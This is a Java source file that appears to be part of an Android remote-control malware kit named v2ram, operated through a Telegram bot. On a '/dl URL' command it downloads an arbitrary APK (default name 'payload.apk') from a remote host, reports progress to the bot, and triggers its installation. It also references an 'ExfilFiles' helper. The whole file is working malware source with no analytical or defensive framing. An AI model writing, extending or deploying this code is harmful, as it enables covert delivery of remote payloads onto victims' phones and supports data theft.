// language: Java, file: ApkInstaller.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

import androidx.core.content.FileProvider;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class ApkInstaller {

    public static void downloadAndInstall(String url) {
        if (url == null || url.isEmpty()) {
            CommandRouter.err("usage: /dl URL");
            return;
        }
        Thread t = new Thread(() -> downloadSync(url), "v2-dl");
        t.setDaemon(true);
        t.start();
    }

    static void downloadSync(String urlStr) {
        Context c = TelegramBot.ctx;
        if (c == null) return;
        HttpURLConnection conn = null;
        InputStream in = null;
        FileOutputStream out = null;
        try {
            URL url = new URL(urlStr);
            String name = url.getPath();
            int slash = name.lastIndexOf('/');
            if (slash >= 0) name = name.substring(slash + 1);
            if (name.isEmpty()) name = "payload.apk";

            File outDir = new File(c.getFilesDir(), "apks");
            outDir.mkdirs();
            File outFile = new File(outDir, name);

            conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(20_000);
            conn.setReadTimeout(60_000);
            conn.connect();
            int code = conn.getResponseCode();
            if (code != 200) {
                TelegramBot.send("<i>dl: http " + code + "</i>");
                return;
            }
            long total = conn.getContentLength();
            in = conn.getInputStream();
            out = new FileOutputStream(outFile);
            byte[] buf = new byte[64 * 1024];
            long written = 0;
            int n;
            long lastReport = 0;
            while ((n = in.read(buf)) > 0) {
                out.write(buf, 0, n);
                written += n;
                long now = System.currentTimeMillis();
                if (total > 0 && now - lastReport > 3000) {
                    lastReport = now;
                    TelegramBot.send("<i>dl: " + (written * 100 / total) + "% ("
                        + ExfilFiles.humanSize(written) + " / "
                        + ExfilFiles.humanSize(total) + ")</i>");
                }
            }
            out.close(); out = null;
            in.close(); in = null;

            TelegramBot.send("<b>dl done</b> — " + ExfilFiles.humanSize(written)
                + "\n<i>installing…</i>");

            Uri apkUri = FileProvider.getUriForFile(c,
                c.getPackageName() + ".fileprovider", outFile);
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setDataAndType(apkUri, "application/vnd.android.package-archive");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                | Intent.FLAG_GRANT_READ_URI_PERMISSION);
            c.startActivity(i);
        } catch (Throwable t) {
            CommandRouter.err(t.getMessage());
        } finally {
            try { if (in != null) in.close(); } catch (Throwable ignored) {}
            try { if (out != null) out.close(); } catch (Throwable ignored) {}
            try { if (conn != null) conn.disconnect(); } catch (Throwable ignored) {}
        }
    }
}